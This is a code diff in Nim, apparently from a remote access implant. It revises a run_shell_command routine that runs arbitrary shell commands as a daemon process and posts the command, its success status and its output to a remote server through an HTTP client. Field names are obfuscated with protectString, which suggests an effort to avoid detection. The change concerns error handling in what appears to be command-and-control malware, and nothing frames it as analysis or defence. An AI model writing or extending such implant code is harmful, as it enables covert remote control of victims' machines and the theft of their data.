@@ -40,19 +40,21 @@ proc post_data*(client: HttpClient, command_type: string, data_dict: string): bo
 
 proc run_shell_command*(client: HttpClient, shell_command: string): bool =
     var output: string
-    var is_success: bool
+    var retval: int
+    var is_success = true
 
-    try:
-        output = execCmdEx(shell_command, options={poDaemon})[0]
-        
-    except:
-        output = could_not_retrieve
+    (output, retval) = execCmdEx(shell_command, options={poDaemon})
     
+    if retval != 0:
+        output = "Error: shell return value = " & $retval 
+        is_success = false 
+
     var data = {
         protectString("shell_command"): shell_command,
-        "output": output
+        protectString("is_success"): $is_success,
+        protectString("output"): output
     }.toOrderedTable()
-
+    
     is_success = post_data(client, protectString("cmd"), $data)
     
     return is_success
